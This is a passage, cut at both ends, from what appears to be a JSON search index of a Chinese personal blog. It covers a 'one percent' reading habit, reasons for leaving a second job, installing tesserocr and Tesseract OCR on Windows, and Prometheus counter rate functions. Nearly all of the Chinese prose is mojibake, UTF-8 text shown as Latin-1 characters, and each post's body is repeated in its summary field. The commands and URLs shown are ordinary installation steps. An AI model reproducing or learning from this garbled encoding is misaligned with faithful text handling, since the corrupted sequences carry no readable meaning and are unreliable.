pw4ã€‚\næˆ‘ç»™è‡ªå·±åˆ¶å®šäº†ä¸€ä¸ªå°çš„è¯»ä¹¦è®¡åˆ’ã€‚\næ¯å¤©è‡³å°‘è¯»ä¸€æœ¬ä¹¦çš„1%ï¼Œæ¯å¤©è¯»è‡³å°‘äº”æœ¬ä¹¦ã€‚\næˆ‘å½“æ—¶è¿˜ç”¨excelè®°å½•äº†æ¯å¤©ï¼Œæ¯æœ¬ä¹¦çš„é˜…è¯»è¿›åº¦ã€‚è¿™ç§ä¹ æƒ¯æŒç»­äº†åŠå¹´å·¦å³ï¼Œç›´åˆ°æˆ‘åšæ‰‹æœ¯æ—¶æ‰ç»ˆæ­¢ã€‚\nå½“æˆ‘å›é¦–é‚£æ®µè¯»ä¹¦æ—¶é—´åï¼Œåœ¨ä¸çŸ¥ä¸è§‰ä¸­ï¼Œæˆ‘ç«Ÿç„¶è¯»å®Œäº†ä¸€ç™¾å¤šæœ¬ä¹¦ã€‚\nåŠå¹´æ—¶é—´æˆ‘è¯»çš„ä¹¦ï¼Œè¦æ¯”æˆ‘å¤§å­¦å››å¹´è¯»çš„ä¹¦è¿˜è¦å¤šã€‚\nåˆ†æåŸå› ï¼Œåˆ™æ€»ç»“å‡ºä»¥ä¸‹ä¸‰ç‚¹\n1. é‡åŒ– é‡åŒ–ï¼šæ¯æ¬¡è¯»ä¹¦ï¼Œè‡³å°‘è¦è¯»ç™¾åˆ†ä¹‹ä¸€ã€‚å½“ç„¶è¿™åªæ˜¯ä¸€ä¸ªç†è®ºå€¼ï¼Œæœ€ä½çš„é™åº¦æ˜¯è‡³å°‘ç¿»ä¸€é¡µã€‚å› ä¸ºæœ‰äº›éå¸¸åšçš„ä¹¦ï¼Œå³ä½¿æ˜¯ç™¾åˆ†ä¹‹ä¸€ï¼Œä¸€å¤©ä¹‹å†…ä¹Ÿæ˜¯å¾ˆéš¾è¯»å®Œçš„ã€‚ä¾‹å¦‚ã€Šæƒåˆ©çš„æ¸¸æˆå…¨é›†ã€‹è‹±æ–‡ç‰ˆï¼Œæˆ‘å‡ ä¹æ¯å¤©éƒ½çœ‹ï¼Œçœ‹äº†ä¸€å‘¨ä¹‹åï¼Œå†çœ‹çœ‹è¿›åº¦ï¼Œè¿˜æ˜¯ä¸è¶³ç™¾åˆ†ä¹‹ä¸€ã€‚\n2. è§‚æµ‹ è§‚æµ‹ï¼šå°±æ˜¯éœ€è¦è®°å½•è¯»ä¹¦çš„è¿›åº¦ï¼Œå› ä¸ºåªæœ‰èƒ½è§‚æµ‹åˆ°é˜…è¯»çš„è¿›åº¦ï¼Œæ‰ä¼šæ¯”è¾ƒå®¹æ˜“å‘ç°æ—¶é—´çš„ç´¯ç§¯æ•ˆæœï¼Œæ‰ä¼šæœ‰ç›®æ ‡ã€‚ç®€å•çš„æ–¹æ³•ä½ å¯ä»¥ç”¨ä¸ªexcel, æ¯å¤©è®°å½•è¿›åº¦ã€‚\nä¾‹å¦‚å¦‚ä¸‹è¡¨æ ¼ï¼š\nä¹¦å 08-04(å‘¨ä¸€) 05 06 07 08 09 10 ä¸‰ä½“ 5% 6% ç™¾å¹´å­¤ç‹¬ 20% 22% 3. æ”¾å¼ƒ æ”¾å¼ƒï¼šäººåœ¨é€‰ä¹¦ï¼Œä¹¦ä¹Ÿåœ¨é€‰äººã€‚æœ‰æ—¶å€™ï¼Œä¸€æœ¬ä¹¦è¯»äº†ä¸€å°éƒ¨åˆ†ï¼Œå‘ç°è¯»ä¹‹æ— å‘³ï¼Œä¸è¯»åˆè§‰å¾—ä¸è¯¥ä¸­é€”æ”¾å¼ƒã€‚è¿™æ—¶å€™ï¼Œä½ åº”è¯¥æ”¾å¼ƒç»§ç»­è¯»è¿™æœ¬ä¹¦ï¼ŒæŠŠå®ƒæ”¾åˆ°ä¸€è¾¹ï¼Œé€‰æ‹©å…¶ä»–çš„ä¹¦æ¥çœ‹ã€‚\n4. åšæŒ åšæŒï¼šä¸€ä»¶äº‹æƒ…ï¼Œå³ä½¿å†å›°éš¾ï¼Œåªè¦èƒ½åšæŒä¸¤å‘¨ä»¥ä¸Šï¼Œå°±ä¼šå½¢æˆä¹ æƒ¯ã€‚ä¸€æ—¦å½¢æˆä¹ æƒ¯ï¼Œå›°éš¾åº¦å°±ä¼šæ˜¾è‘—é™ä½ã€‚ ä»¥å‰æˆ‘å­¦è½¦çš„æ—¶å€™ï¼Œæ¯å¤©éƒ½è¦äº”ç‚¹èµ·åºŠï¼Œå»é©¾æ ¡å­¦è½¦ã€‚åˆšå¼€å§‹ç¬¬ä¸€å¤©ï¼Œäº”ç‚¹èµ·åºŠï¼Œè¢«çªé‡Œä»¿ä½›æ˜¯ä¸ªé»‘æ´æ¼©æ¶¡ï¼Œè€Œæˆ‘å¿…è¦è¦æœ‰ä¸€ä¸ªé€ƒé€¸é€Ÿåº¦æ‰èƒ½ä¸è¢«é»‘æ´æ‹‰è¿›å»ã€‚ ç„¶è€ŒåšæŒä¸€å‘¨ä¹‹åï¼Œå­¦è½¦ç»“æŸäº†ï¼Œå¼€å§‹æ­£å¸¸ä¸Šç­ï¼Œæˆ‘å‘ç°æˆ‘ä¹Ÿèƒ½å¾ˆè‡ªç„¶çš„åœ¨äº”ç‚¹èµ·åºŠã€‚ æ‰€ä»¥ï¼Œä¸è¦ä»¥ä¸ºç™¾åˆ†ä¹‹ä¸€å¾ˆå°ï¼Œä¹Ÿä¸è¦ä»¥ä¸ºé˜…è¯»å¾ˆéš¾ï¼Œè‡ªå·±å…ˆè¯•è¯•ï¼Œçœ‹çœ‹ä¸¤å‘¨ä¹‹åçš„ç»“æœã€‚\n5. é’ˆå¯¹æ€§ å¯¹äºä¸åŒç±»å‹çš„ä¹¦ï¼Œè¯»ä¹¦æ–¹æ³•ä¹Ÿä¸åŒï¼Œè¿™é‡Œæ¨èå¤§å®¶çœ‹çœ‹ã€Šå¦‚ä½•é˜…è¯»ä¸€æœ¬ä¹¦ã€‹","title":"#0 ç™¾åˆ†ä¹‹ä¸€é˜…è¯»æ–¹æ³•"},{"content":"æ€»ç»“ ç¬¬äºŒä»½å·¥ä½œå¿«åˆ°ä¸€å¹´äº†ï¼Œæˆ‘æœ€è¿‘ç”³è¯·ç¦»èŒäº†ã€‚\nåŒäº‹é—®æˆ‘ç¦»èŒåŸå› ï¼Œæˆ‘è¯´è¢«é¢†å¯¼éª‚äº†ï¼Œæ„Ÿè§‰è‡ªå°Šå—è¾±ï¼Œç´¢æ€§ä¸å¹²äº†ã€‚\nå®é™…ä¸Šè¢«é¢†å¯¼éª‚åªæ˜¯å‹æ­»éª†é©¼çš„æœ€åä¸€æ ¹ç¨»è‰ï¼Œæˆ‘ä¹Ÿä¸æ˜¯é‚£ç§ä¼šå¿ƒè¡€æ¥æ½®è¯´å¹²å°±ä¸å¹²çš„ã€‚\nè¿™ä»½å·¥ä½œï¼Œæˆ‘åšäº†ä¸åˆ°ä¸€å¹´ï¼Œå¤§éƒ¨åˆ†çš„æ—¶é—´æˆ‘æ˜¯åšçš„ä¸å¼€å¿ƒçš„ã€‚\næ‰€ä»¥ç¦»èŒæ˜¯ä¸€ç›´åœ¨å¿ƒé‡Œé…é…¿ã€‚\nä¸ºä»€ä¹ˆä¼šå·¥ä½œä¸å¼€å¿ƒï¼Ÿ\nä¸»è¦åŸå› æœ‰ä»¥ä¸‹å››ç‚¹ï¼š\nè¡Œä¸šå‰æ™¯æš—æ·¡ï¼šSå…¬å¸å¤„åœ¨è¡Œä¸šçš„ä¸­æ¸¸ï¼Œä¸Šæ¸¸å—åˆ°è¿è¥å•†ç®¡æ§ï¼Œä¸‹æ¸¸åœ¨å®¢æˆ·å±‚é¢è¯è¯­æƒä¹Ÿä¸å¤§ã€‚è¿™æ˜¯ä¸€ä¸ªèµ„æºé™åˆ¶å‹çš„è¡Œä¸šï¼Œè¡Œä¸šçš„å‘½è„‰å°±åœ¨è¿è¥å•†ï¼Œå¯èƒ½è¿è¥å•†æœ‰ä¸ªé£å¹è‰åŠ¨ï¼Œæ•´ä¸ªè¡Œä¸šå°±è¦ç¿»æ±Ÿå€’æµ·ã€‚ è‡ªç ”èƒ½åŠ›è–„å¼±ï¼šSå…¬å¸å¤§éƒ¨åˆ†ä¸šåŠ¡éƒ½æ˜¯è´­ä¹°çš„ç¬¬ä¸‰æ–¹çš„è½¯ä»¶ï¼Œå„ç§å˜æ›´éƒ½å—åˆ°åˆ¶çº¦ï¼Œæ·»åŠ ä¸€ä¸ªå°åŠŸèƒ½éƒ½è¦ä»˜è´¹å‡çº§ã€‚è‡ªç ”èƒ½åŠ›å¼±çš„ä¸€ä¸ªåŸå› å¯èƒ½å°±æ˜¯å‰äº›å¹´èµšé’±å¤ªå®¹æ˜“äº†ï¼ŒæŠ•èµ„ç ”å‘å“ªæœ‰èµšå¿«é’±æ¥çš„èˆ’æœå‘¢ã€‚åŒæ—¶ä¹Ÿæ˜¯è¿™ä¸ªåŸå› ï¼Œå¤šä¸ªç¬¬ä¸‰æ–¹è½¯ä»¶ä¹‹é—´ä¹Ÿé€ æˆäº†æ•°æ®å‰²è£‚ï¼Œè¿è¡Œç»´æŠ¤å›°éš¾ã€‚ å®¶æ—ä¼ä¸šåˆ¶çº¦ï¼šSå…¬å¸å¤§éƒ¨åˆ†äººå‘˜éƒ½æ˜¯è€æ¿çš„äº²æœ‹å¥½å‹ï¼Œå®¶æ—å¼ä¼ä¸šçš„ä¼˜ç‚¹æ˜¯å†…èšåŠ›å¼ºï¼Œä½†æ˜¯åŒ…å®¹æ€§å¼±ã€‚ä¹‹å‰ä¹Ÿæœ‰ä¸€äº›å¤§å‚è¿›æ¥çš„å‘˜å·¥ï¼Œæ²¡å¤šä¹…å°±è¾èŒäº†ã€‚ æˆ‘æ›¾ç»ä¹Ÿè·Ÿè€æ¿æ²Ÿé€šè¿‡ï¼Œä¼¼ä¹è€æ¿ä¹Ÿæœ‰å¿ƒåšäº›å˜é©ã€‚ä½†æ˜¯å˜é©å“ªæœ‰é‚£ä¹ˆå®¹æ˜“ï¼Œè¦å˜é©ä¸æ—©éƒ½å˜äº†ï¼Œè¿˜è¦ç­‰åˆ°ç°åœ¨ï¼Ÿ çŸ­æœŸä¸»ä¹‰ï¼šä¼¼ä¹Så…¬å¸æ²¡æœ‰ä»€ä¹ˆå…·ä½“çš„æ„¿æ™¯ï¼Œå”¯ä¸€æ„Ÿè§‰åˆ°çš„æ„¿æ™¯å°±æ˜¯èµšå¿«é’±ã€‚ä¸€æ—¦å‘ç°æŠ•å…¥çš„å›æŠ¥å¤ªå°‘ï¼Œå°±ç«‹å³åˆ‡æ¢ç›®æ ‡ã€‚ ä¼ä¸šå…³æ€€å·®ï¼šè¯´å®åœ¨ï¼Œæˆ‘æ²¡æœ‰æ„Ÿè§‰åˆ°å¤šå°‘å‘˜å·¥å…³æ€€ã€‚åœ¨Så…¬å¸çš„å·¥ä½œå’Œåœ¨åœ°ä¸»å®¶åšçŸ­å·¥ä¹Ÿæ²¡å•¥åŒºåˆ«ï¼Œè€æ¿æƒ³ä»€ä¹ˆéƒ½è¦ç®¡ï¼Œä½†æ˜¯å³ç®¡ä¸äº†é‚£ä¹ˆå¤šï¼Œåˆç®¡çš„ä¸å¥½ã€‚æ‰€ä»¥ç»™äººçš„æ„Ÿè§‰å°±æ˜¯ä¸œä¸€æ£’æ§Œï¼Œè¥¿ä¸€æ¦”å¤´ï¼Œçœ‹èµ·æ¥å¾ˆå–åŠ›ï¼Œå®é™…ä¸Šå¹¶æ²¡æœ‰ä»€ä¹ˆäº§å‡ºã€‚å‡ ä¹æ¯ä¸ªæœˆéƒ½æœ‰äººç¦»èŒï¼Œå¯¹å‘˜å·¥éƒ½åå•¬ï¼Œä¸è€ƒè™‘å‘˜å·¥çš„è‡ªå°Šï¼Œå‘˜å·¥æ€ä¹ˆå¯èƒ½å¯¹å…¬å¸æœ‰å½’å±æ„Ÿã€‚ å·¥ä½œå‹åŠ›å¤§ï¼šå—é™äºèµ„æºæ”¶ç´§ã€äº§å“ä¼˜åŠ¿å°ï¼Œè€æ¿æƒ³æé«˜è¥ä¸šé¢çš„æ–¹æ³•æ˜¯æé«˜å‘˜å·¥çš„æœåŠ¡æ°´å¹³ã€‚è¯´å®åœ¨ï¼Œè¿™çœŸæ˜¯æ¯æ°´è½¦è–ªã€‚ä¸æƒ³ç€ä»åº•å±‚ç³»ç»Ÿçš„è§£å†³é—®é¢˜ï¼Œåªæƒ³ç€é€šè¿‡ç»™å‘˜å·¥å‹åŠ›ã€é€šè¿‡åŠ ç­æ¥è§£å†³é—®é¢˜ï¼Œåªä¼šé€ æˆå·¥ä½œå‹åŠ›å¤§ã€äººå‘˜æµå¤±å¤§ã€‚ æ‰€ä»¥ï¼Œæˆ‘çš„ç¦»èŒï¼Œå®é™…ä¸Šä¹Ÿæ˜¯è€ƒè™‘å†ä¸‰çš„ä¸€ä¸ªé€‰æ‹©ã€‚\nå½“ç„¶ï¼Œæˆ‘åœ¨Så…¬å¸ä¹Ÿä¸æ˜¯ä»€ä¹ˆæ”¶è·éƒ½æ²¡æœ‰ã€‚\næ”¶è·æ€»ç»“ æ·±å…¥äº†è§£äº†è¡Œä¸šçš„è¿è¡ŒåŸç†ã€å®¢æˆ·ã€èµ„æºã€æ”¿ç­–ç­‰ä¿¡æ¯ å¯¹äºæ•°æ®åˆ†ææ–¹é¢æœ‰äº†è¾ƒå¤§çš„è¿›æ­¥ï¼Œæ¯•ç«Ÿæˆ‘åšäº†40+ä¸ªæ•°æ®æŠ¥è¡¨æ¥åˆ†æè¿è¡Œæ•°æ® æ·±å…¥å­¦ä¹ äº†python, ä¸»è¦ç”¨æ¥åšæ•°æ®åˆ†æã€‚æ•°æ®åˆ†ææ–¹é¢çš„åè®®æ ˆä¸»è¦æœ‰pandasã€duckdbã€doris(MySQL)ã€grafanaæ¥ç»„æˆ æ·±å…¥å­¦ä¹ äº†pythonçš„GUIå¼€å‘ï¼Œä¸»è¦ç”¨åˆ°çš„æ¡†æ¶æ˜¯wxPythonï¼Œå¼€å‘çš„ä¸¤ä¸ªå·¥å…·åˆ†åˆ«ç»™åˆ°è¿ç»´äººå‘˜å’Œå®¢æœå»ä½¿ç”¨ï¼Œæ¥æé«˜è¿è¡Œæ•ˆç‡ ","permalink":"https://wdd.js.org/posts/2024/leave-the-second-job/","summary":"æ€»ç»“ ç¬¬äºŒä»½å·¥ä½œå¿«åˆ°ä¸€å¹´äº†ï¼Œæˆ‘æœ€è¿‘ç”³è¯·ç¦»èŒäº†ã€‚\nåŒäº‹é—®æˆ‘ç¦»èŒåŸå› ï¼Œæˆ‘è¯´è¢«é¢†å¯¼éª‚äº†ï¼Œæ„Ÿè§‰è‡ªå°Šå—è¾±ï¼Œç´¢æ€§ä¸å¹²äº†ã€‚\nå®é™…ä¸Šè¢«é¢†å¯¼éª‚åªæ˜¯å‹æ­»éª†é©¼çš„æœ€åä¸€æ ¹ç¨»è‰ï¼Œæˆ‘ä¹Ÿä¸æ˜¯é‚£ç§ä¼šå¿ƒè¡€æ¥æ½®è¯´å¹²å°±ä¸å¹²çš„ã€‚\nè¿™ä»½å·¥ä½œï¼Œæˆ‘åšäº†ä¸åˆ°ä¸€å¹´ï¼Œå¤§éƒ¨åˆ†çš„æ—¶é—´æˆ‘æ˜¯åšçš„ä¸å¼€å¿ƒçš„ã€‚\næ‰€ä»¥ç¦»èŒæ˜¯ä¸€ç›´åœ¨å¿ƒé‡Œé…é…¿ã€‚\nä¸ºä»€ä¹ˆä¼šå·¥ä½œä¸å¼€å¿ƒï¼Ÿ\nä¸»è¦åŸå› æœ‰ä»¥ä¸‹å››ç‚¹ï¼š\nè¡Œä¸šå‰æ™¯æš—æ·¡ï¼šSå…¬å¸å¤„åœ¨è¡Œä¸šçš„ä¸­æ¸¸ï¼Œä¸Šæ¸¸å—åˆ°è¿è¥å•†ç®¡æ§ï¼Œä¸‹æ¸¸åœ¨å®¢æˆ·å±‚é¢è¯è¯­æƒä¹Ÿä¸å¤§ã€‚è¿™æ˜¯ä¸€ä¸ªèµ„æºé™åˆ¶å‹çš„è¡Œä¸šï¼Œè¡Œä¸šçš„å‘½è„‰å°±åœ¨è¿è¥å•†ï¼Œå¯èƒ½è¿è¥å•†æœ‰ä¸ªé£å¹è‰åŠ¨ï¼Œæ•´ä¸ªè¡Œä¸šå°±è¦ç¿»æ±Ÿå€’æµ·ã€‚ è‡ªç ”èƒ½åŠ›è–„å¼±ï¼šSå…¬å¸å¤§éƒ¨åˆ†ä¸šåŠ¡éƒ½æ˜¯è´­ä¹°çš„ç¬¬ä¸‰æ–¹çš„è½¯ä»¶ï¼Œå„ç§å˜æ›´éƒ½å—åˆ°åˆ¶çº¦ï¼Œæ·»åŠ ä¸€ä¸ªå°åŠŸèƒ½éƒ½è¦ä»˜è´¹å‡çº§ã€‚è‡ªç ”èƒ½åŠ›å¼±çš„ä¸€ä¸ªåŸå› å¯èƒ½å°±æ˜¯å‰äº›å¹´èµšé’±å¤ªå®¹æ˜“äº†ï¼ŒæŠ•èµ„ç ”å‘å“ªæœ‰èµšå¿«é’±æ¥çš„èˆ’æœå‘¢ã€‚åŒæ—¶ä¹Ÿæ˜¯è¿™ä¸ªåŸå› ï¼Œå¤šä¸ªç¬¬ä¸‰æ–¹è½¯ä»¶ä¹‹é—´ä¹Ÿé€ æˆäº†æ•°æ®å‰²è£‚ï¼Œè¿è¡Œç»´æŠ¤å›°éš¾ã€‚ å®¶æ—ä¼ä¸šåˆ¶çº¦ï¼šSå…¬å¸å¤§éƒ¨åˆ†äººå‘˜éƒ½æ˜¯è€æ¿çš„äº²æœ‹å¥½å‹ï¼Œå®¶æ—å¼ä¼ä¸šçš„ä¼˜ç‚¹æ˜¯å†…èšåŠ›å¼ºï¼Œä½†æ˜¯åŒ…å®¹æ€§å¼±ã€‚ä¹‹å‰ä¹Ÿæœ‰ä¸€äº›å¤§å‚è¿›æ¥çš„å‘˜å·¥ï¼Œæ²¡å¤šä¹…å°±è¾èŒäº†ã€‚ æˆ‘æ›¾ç»ä¹Ÿè·Ÿè€æ¿æ²Ÿé€šè¿‡ï¼Œä¼¼ä¹è€æ¿ä¹Ÿæœ‰å¿ƒåšäº›å˜é©ã€‚ä½†æ˜¯å˜é©å“ªæœ‰é‚£ä¹ˆå®¹æ˜“ï¼Œè¦å˜é©ä¸æ—©éƒ½å˜äº†ï¼Œè¿˜è¦ç­‰åˆ°ç°åœ¨ï¼Ÿ çŸ­æœŸä¸»ä¹‰ï¼šä¼¼ä¹Så…¬å¸æ²¡æœ‰ä»€ä¹ˆå…·ä½“çš„æ„¿æ™¯ï¼Œå”¯ä¸€æ„Ÿè§‰åˆ°çš„æ„¿æ™¯å°±æ˜¯èµšå¿«é’±ã€‚ä¸€æ—¦å‘ç°æŠ•å…¥çš„å›æŠ¥å¤ªå°‘ï¼Œå°±ç«‹å³åˆ‡æ¢ç›®æ ‡ã€‚ ä¼ä¸šå…³æ€€å·®ï¼šè¯´å®åœ¨ï¼Œæˆ‘æ²¡æœ‰æ„Ÿè§‰åˆ°å¤šå°‘å‘˜å·¥å…³æ€€ã€‚åœ¨Så…¬å¸çš„å·¥ä½œå’Œåœ¨åœ°ä¸»å®¶åšçŸ­å·¥ä¹Ÿæ²¡å•¥åŒºåˆ«ï¼Œè€æ¿æƒ³ä»€ä¹ˆéƒ½è¦ç®¡ï¼Œä½†æ˜¯å³ç®¡ä¸äº†é‚£ä¹ˆå¤šï¼Œåˆç®¡çš„ä¸å¥½ã€‚æ‰€ä»¥ç»™äººçš„æ„Ÿè§‰å°±æ˜¯ä¸œä¸€æ£’æ§Œï¼Œè¥¿ä¸€æ¦”å¤´ï¼Œçœ‹èµ·æ¥å¾ˆå–åŠ›ï¼Œå®é™…ä¸Šå¹¶æ²¡æœ‰ä»€ä¹ˆäº§å‡ºã€‚å‡ ä¹æ¯ä¸ªæœˆéƒ½æœ‰äººç¦»èŒï¼Œå¯¹å‘˜å·¥éƒ½åå•¬ï¼Œä¸è€ƒè™‘å‘˜å·¥çš„è‡ªå°Šï¼Œå‘˜å·¥æ€ä¹ˆå¯èƒ½å¯¹å…¬å¸æœ‰å½’å±æ„Ÿã€‚ å·¥ä½œå‹åŠ›å¤§ï¼šå—é™äºèµ„æºæ”¶ç´§ã€äº§å“ä¼˜åŠ¿å°ï¼Œè€æ¿æƒ³æé«˜è¥ä¸šé¢çš„æ–¹æ³•æ˜¯æé«˜å‘˜å·¥çš„æœåŠ¡æ°´å¹³ã€‚è¯´å®åœ¨ï¼Œè¿™çœŸæ˜¯æ¯æ°´è½¦è–ªã€‚ä¸æƒ³ç€ä»åº•å±‚ç³»ç»Ÿçš„è§£å†³é—®é¢˜ï¼Œåªæƒ³ç€é€šè¿‡ç»™å‘˜å·¥å‹åŠ›ã€é€šè¿‡åŠ ç­æ¥è§£å†³é—®é¢˜ï¼Œåªä¼šé€ æˆå·¥ä½œå‹åŠ›å¤§ã€äººå‘˜æµå¤±å¤§ã€‚ æ‰€ä»¥ï¼Œæˆ‘çš„ç¦»èŒï¼Œå®é™…ä¸Šä¹Ÿæ˜¯è€ƒè™‘å†ä¸‰çš„ä¸€ä¸ªé€‰æ‹©ã€‚\nå½“ç„¶ï¼Œæˆ‘åœ¨Så…¬å¸ä¹Ÿä¸æ˜¯ä»€ä¹ˆæ”¶è·éƒ½æ²¡æœ‰ã€‚\næ”¶è·æ€»ç»“ æ·±å…¥äº†è§£äº†è¡Œä¸šçš„è¿è¡ŒåŸç†ã€å®¢æˆ·ã€èµ„æºã€æ”¿ç­–ç­‰ä¿¡æ¯ å¯¹äºæ•°æ®åˆ†ææ–¹é¢æœ‰äº†è¾ƒå¤§çš„è¿›æ­¥ï¼Œæ¯•ç«Ÿæˆ‘åšäº†40+ä¸ªæ•°æ®æŠ¥è¡¨æ¥åˆ†æè¿è¡Œæ•°æ® æ·±å…¥å­¦ä¹ äº†python, ä¸»è¦ç”¨æ¥åšæ•°æ®åˆ†æã€‚æ•°æ®åˆ†ææ–¹é¢çš„åè®®æ ˆä¸»è¦æœ‰pandasã€duckdbã€doris(MySQL)ã€grafanaæ¥ç»„æˆ æ·±å…¥å­¦ä¹ äº†pythonçš„GUIå¼€å‘ï¼Œä¸»è¦ç”¨åˆ°çš„æ¡†æ¶æ˜¯wxPythonï¼Œå¼€å‘çš„ä¸¤ä¸ªå·¥å…·åˆ†åˆ«ç»™åˆ°è¿ç»´äººå‘˜å’Œå®¢æœå»ä½¿ç”¨ï¼Œæ¥æé«˜è¿è¡Œæ•ˆç‡ ","title":"ç¬¬äºŒä»½å·¥ä½œçš„è¾èŒæ€»ç»“"},{"content":"å®‰è£…tesserocr-windows_build åˆ°tesserocr-windows_build releaseé¡µé¢ä¸‹è½½å¯¹åº”çš„whlæ–‡ä»¶\nå¦‚ä¸‹è½½ tesserocr-2.6.2-cp312-cp312-win_amd64.whlï¼Œ ä¸‹è½½ä¹‹åç”¨pipå®‰è£…\npip install tesserocr-2.6.2-cp312-cp312-win_amd64.whl å®‰è£…ocr windows exeç¨‹åº åœ¨è¿™ä¸ªé¡µé¢ï¼Œæœ‰å¯¹åº”çš„exeç¨‹åºï¼Œhttps://digi.bib.uni-mannheim.de/tesseract/\nä¾‹å¦‚ä¸‹è½½è¿™ä¸ªexeæ–‡ä»¶ https://digi.bib.uni-mannheim.de/tesseract/tesseract-ocr-w64-setup-v5.3.0.20221214.exe\nä¸‹è½½å®Œæˆä¹‹åç‚¹å‡»å®‰è£…ï¼Œä¸€èˆ¬æˆ‘ä»¬ä¸éœ€è¦ä¿®æ”¹ä»–çš„å®‰è£…ä½ç½®ï¼Œé»˜è®¤çš„å®‰è£…ä½ç½®æ˜¯C:\\Program Files\\Tesseract-OCR\næˆ‘ä»¬å°†C:\\Program Files\\Tesseract-OCR\\tessdataä¸‹çš„æ‰€æœ‰æ–‡ä»¶ï¼Œå¤åˆ¶åˆ°C:\\Program Files\\Tesseract-OCR\\ç›®å½•ä¸‹\nå‚è€ƒ https://github.com/simonflueckiger/tesserocr-windows_build/releases https://digi.bib.uni-mannheim.de/tesseract/ https://tesseract-ocr.github.io/tessdoc/Downloads.html https://blog.csdn.net/Yuyh131/article/details/103880585 ","permalink":"https://wdd.js.org/posts/2024/windows-install-tesserocr/","summary":"å®‰è£…tesserocr-windows_build åˆ°tesserocr-windows_build releaseé¡µé¢ä¸‹è½½å¯¹åº”çš„whlæ–‡ä»¶\nå¦‚ä¸‹è½½ tesserocr-2.6.2-cp312-cp312-win_amd64.whlï¼Œ ä¸‹è½½ä¹‹åç”¨pipå®‰è£…\npip install tesserocr-2.6.2-cp312-cp312-win_amd64.whl å®‰è£…ocr windows exeç¨‹åº åœ¨è¿™ä¸ªé¡µé¢ï¼Œæœ‰å¯¹åº”çš„exeç¨‹åºï¼Œhttps://digi.bib.uni-mannheim.de/tesseract/\nä¾‹å¦‚ä¸‹è½½è¿™ä¸ªexeæ–‡ä»¶ https://digi.bib.uni-mannheim.de/tesseract/tesseract-ocr-w64-setup-v5.3.0.20221214.exe\nä¸‹è½½å®Œæˆä¹‹åç‚¹å‡»å®‰è£…ï¼Œä¸€èˆ¬æˆ‘ä»¬ä¸éœ€è¦ä¿®æ”¹ä»–çš„å®‰è£…ä½ç½®ï¼Œé»˜è®¤çš„å®‰è£…ä½ç½®æ˜¯C:\\Program Files\\Tesseract-OCR\næˆ‘ä»¬å°†C:\\Program Files\\Tesseract-OCR\\tessdataä¸‹çš„æ‰€æœ‰æ–‡ä»¶ï¼Œå¤åˆ¶åˆ°C:\\Program Files\\Tesseract-OCR\\ç›®å½•ä¸‹\nå‚è€ƒ https://github.com/simonflueckiger/tesserocr-windows_build/releases https://digi.bib.uni-mannheim.de/tesseract/ https://tesseract-ocr.github.io/tessdoc/Downloads.html https://blog.csdn.net/Yuyh131/article/details/103880585 ","title":"Windowså®‰è£…Tesserocr"},{"content":"counterç±»å‹çš„å˜åŒ–ç‡ rate, irate, increase counterç±»å‹ä¸€èˆ¬æ˜¯åªå¢ä¸å‡çš„ç´¯ç§¯å€¼ï¼Œä¾‹å¦‚ç³»ç»Ÿç´¯è®¡çš„httpè¯·æ±‚æ•°é‡, ç´¯è®¡çš„è¯å•æ•°é‡ã€‚\ncounterç±»å‹çš„æŒ‡æ ‡å˜åŒ–ç‡ä¸€èˆ¬ä½¿ç”¨ä¸‰ä¸ªå‡½æ•°æ¥è®¡ç®—ï¼Œrate, irate, increase\næŒ‡æ ‡æ¯éš”15sé‡‡æ ·ä¸€æ¬¡æ•°æ®, Aåˆ—æ˜¯é‡‡é›†çš„æŒ‡æ ‡å€¼ï¼ŒBåˆ—æ˜¯å¯¹åº”çš„é‡‡é›†æ—¶é—´ã€‚\ndemo_api_request_duration_seconds_count{instance=\u0026#34;demo-service-0:10000\u0026#34;,path=\u0026#34;/api/bar\u0026#34;,status=\u0026#34;200\u0026#34;,method=\u0026#34;GET\u0026#34;}[1m] åºå· A B 1 294401976 1710549816.105 2 294402185 1710549831.105 3 294402393 1710549846.105 4 294402599 1710549861.105 rateæ˜¯è®¡ç®—æ¯ç§’çš„å˜åŒ–ç‡,\nrate è®¡ç®—æ–¹æ¡ˆ (A4-A1) / (B4-B1)ï¼Œ è¿™é‡Œé€‰æ‹©äº†é¦–å°¾ä¸¤ä¸ªå€¼çš„å·®å€¼ï¼Œé™¤ä»¥æ—¶é•¿ç§’ irate è®¡ç®—æ–¹æ¡ˆ (A4-A3) / (B4-B3) , è¿™é‡Œåªé€‰æ‹©é‡Œæœ€åä¸¤ä¸ªç‚¹çš„å·®å€¼ï¼Œé™¤ä»¥æ—¶é•¿ç§’ increase è®¡ç®—æ–¹å¼ (A4-A1) / (B4-B1) * 60, è¿™é‡Œçš„60æ˜¯1m, å…¶å®increaseå°±æ˜¯rate() * windows_secondsçš„è¯­æ³•ç³– guage 296164749 @1710648381.105 296165055 @1710648396.105 296165364 @1710648411.105 296165668 @1710648426.105 296165978 @1710648441.105 296166186 @1710648456.105 296166505 @1710648471.105 296166826 @1710648486.105 296167151 @1710648501.105 296167478 @1710648516.105 296167810 @1710648531.105 296168139 @1710648546.105 296168472 @1710648561.105 296168764 @1710648576.105 296169026 @1710648591.105 296169363 @1710648606.105 296169709 @1710648621.105 296170059 @1710648636.105 296170410 @1710648651.105 296170759 @1710648666.107 ","permalink":"https://wdd.js.org/posts/2024/learn-prom-with-excel/","summary":"counterç±»å‹çš„å˜åŒ–ç‡ rate, irate, increase counterç±»å‹ä¸€èˆ¬æ˜¯åªå¢ä¸å‡çš„ç´¯ç§¯å€¼ï¼Œä¾‹å¦‚ç³»ç»Ÿç´¯è®¡çš„httpè¯·æ±‚æ•°é‡, ç´¯è®¡çš„è¯å•æ•°é‡ã€‚\ncounterç±»å‹çš„æŒ‡æ ‡å˜åŒ–ç‡ä¸€èˆ¬ä½¿ç”¨ä¸‰ä¸ªå‡½æ•°æ¥è®¡ç®—ï¼Œrate, irate, increase\næŒ‡æ ‡æ¯éš”15sé‡‡æ ·ä¸€æ¬¡æ•°æ®, Aåˆ—æ˜¯é‡‡é›†çš„æŒ‡æ ‡å€¼ï¼ŒBåˆ—æ˜¯å¯¹åº”çš„é‡‡é›†æ—¶é—´ã€‚\ndemo_api_request_duration_seconds_count{instance=\u0026#34;demo-service-0:10000\u0026#34;,path=\u0026#34;/api/bar\u0026#34;,status=\u0026#34;200\u0026#34;,method=\u0026#34;GET\u0026#34;}[1m] åºå· A B 1 294401976 1710549816.105 2 294402185 1710549831.105 3 294402393 1710549846.105 4 294402599 1710549861.105 rateæ˜¯è®¡ç®—æ¯ç§’çš„å˜åŒ–ç‡,\nrate 